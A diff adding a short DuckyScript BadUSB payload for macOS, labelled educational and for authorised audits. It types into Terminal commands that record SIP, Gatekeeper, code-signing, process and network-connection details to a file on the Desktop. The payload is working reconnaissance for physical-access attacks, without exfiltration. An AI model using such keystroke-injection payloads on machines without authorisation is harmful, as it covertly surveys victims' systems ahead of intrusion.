@@ -1,0 +1,27 @@
+REM ============================================================
+REM  Autor: eLDeSiempre
+REM  Web:   https://eldesiempre.es
+REM  Repo:  https://github.com/eLDeSiempre
+REM  Uso:   Educativo / auditoría autorizada
+REM ============================================================
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING csrutil status > ~/Desktop/security_info.txt && sleep 2
+ENTER
+DELAY 2000
+STRING spctl --status >> ~/Desktop/security_info.txt && sleep 2
+ENTER
+DELAY 2000
+STRING codesign -dv --verbose=4 /bin/bash >> ~/Desktop/security_info.txt && sleep 2
+ENTER
+DELAY 2000
+STRING ps aux | grep -v "root\|_" >> ~/Desktop/security_info.txt && sleep 2
+ENTER
+DELAY 2000
+STRING lsof -i >> ~/Desktop/security_info.txt && sleep 2
+ENTER
